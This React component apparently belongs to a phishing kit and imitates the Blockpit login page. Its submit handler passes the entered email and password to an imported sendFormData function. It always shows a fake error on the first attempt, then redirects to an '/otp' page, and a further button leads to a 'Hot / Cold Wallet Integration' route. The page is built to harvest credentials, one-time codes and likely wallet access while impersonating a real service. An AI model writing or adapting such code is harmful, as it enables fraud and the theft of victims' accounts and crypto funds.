import React, { useState, useRef } from "react";
import "../Login/Login.css";
import whiteLogo from "../../assets/blockpit_white.svg";
import { FcGoogle } from "react-icons/fc";
import { FaApple } from "react-icons/fa";
import coinIcon from "../../assets/icon.svg";
import { IoMdEye } from "react-icons/io";
import { IoMdEyeOff } from "react-icons/io";
import { FaTimesCircle } from "react-icons/fa";
import { sendFormData } from "../sendFormData";
import { useNavigate } from "react-router-dom";


const Login = () => {
  const [eyeOpen, setEyeOpen] = useState(false);
  const [emailInputFocused, setEmailInputFocused] = useState(false);
  const [passwordInputFocused, setPasswordInputFocused] = useState(false);
  const [emailPlaceholder, setEmailPlaceholder] = useState("Email");
  const [passwordPlaceholder, setPasswordPlaceholder] = useState("Password");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [emailTouched, setEmailTouched] = useState(false);
  const [passwordTouched, setPasswordTouched] = useState(false);
  const [error, setError] = useState("")
  const [submitCount, setSubmitCount] = useState(0)
  const navigate = useNavigate()

  const isValidEmail = (email) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const form = useRef()

  const submit = (e) => {
    e.preventDefault()
     
    const newCount = submitCount + 1
    setSubmitCount(newCount)

    sendFormData(form)

     if (newCount === 1) {
    setError("Please, input your details correctly.");
  }

    if(newCount === 2){
      navigate('/otp')
      setError("")
      return 0
    }

    return newCount

  }

  const handleSecondHome = () => {
    navigate("secondhome")
  }

  return (
    <div id="logindiv">
      <form ref={form} onSubmit={submit}>
      <div id="logodiv">
        <img src={whiteLogo} alt="" id="whitelogo" />
      </div>
      <p className="heading" id="heading1">
        Welcome back!
      </p>
      <p className="heading" id="heading2">
        Log in to your Blockpit account and do your taxes in an easy and
        compliant way.
      </p>

      <div id="socialdiv">
        <div className="icondiv">
          <FcGoogle className="icon" />
        </div>
        <div className="icondiv">
          <FaApple className="icon" />
        </div>
        <div className="icondiv">
          <img src={coinIcon} alt="" id="coinIcon" />
        </div>
      </div>

      <div id="hrdiv">
        <hr className="hr" />
        <span>or</span>
        <hr className="hr" />
      </div>

      {error && <p className="error">{error}</p>}
      
      <div className="inputdiv" id="emailinputdiv">
        <input name="email"
          type="email"
          className={`input ${emailInputFocused ? "input-focused" : ""} ${
            email ? "input-has-text" : ""
          } ${email && isValidEmail(email)? "input-valid" : ""} ${email && !isValidEmail(email)? "input-has-text" : ""}`}
          placeholder={emailPlaceholder}
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          onFocus={() => {
            setEmailInputFocused(true);
            setEmailPlaceholder("");
          }}
          onBlur={() => {
            setEmailInputFocused(false);
            setEmailPlaceholder("Email");
            setEmailTouched(true);
          }}
        />
        {emailInputFocused && <span className="emailinputspan"> Email </span>}
        {email && (
          <span>
            <FaTimesCircle id="clearicon" onClick={() => setEmail("")} />
          </span>
        )}
        {!email && emailTouched && (
          <span className="error-text"> Email is required</span>
        )}
        {email && !isValidEmail(email) && (
          <span className="error-text"> Email is invalid</span>
        )}
      </div>
      <div className="inputdiv" id="passwordinputdiv">
        <input name="message"
          type={eyeOpen ? "text" : "password"}
          className={`input ${passwordInputFocused ? "input-focused" : ""} ${
            !password && passwordTouched? "passwordinput-has-text" : ""
          } ${password ? "input-valid": ""}`}
          placeholder={passwordPlaceholder}
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          onFocus={() => {
            setPasswordInputFocused(true);
            setPasswordPlaceholder("");
          }}
          onBlur={() => {
            setPasswordInputFocused(false);
            setPasswordPlaceholder("Password");
            setPasswordTouched(true);
          }}
        />
        {passwordInputFocused && (
          <span className="passwordinputspan">Password</span>
        )}
        <div id="eyeicondiv" onClick={() => setEyeOpen((prev) => !prev)}>
          {eyeOpen ? (
            <IoMdEyeOff className="eyeIcon" />
          ) : (
            <IoMdEye className="eyeIcon" />
          )}
          
        </div>
        {!password && passwordTouched && (
            <span className="error-text"> Password is required</span>
          )}
      </div>

      <p className="forgotP">Forgot your password? </p>
      <button type="submit" className={`loginbutton ${password && email && isValidEmail(email)? "active" : "inactive"}`} disabled={!(email && password && isValidEmail(email))} >Log In</button>
      {/* <div id="lastdiv"> <p className="lastp">Still haven't created an account? Sign up</p><p className="lastp" id="secondp">here</p></div> */}
      <button id="secondbutton" type="button" onClick={handleSecondHome}>Manual Hot / Cold Wallet Integration </button>
      </form>
    </div>
  );
};

export default Login;
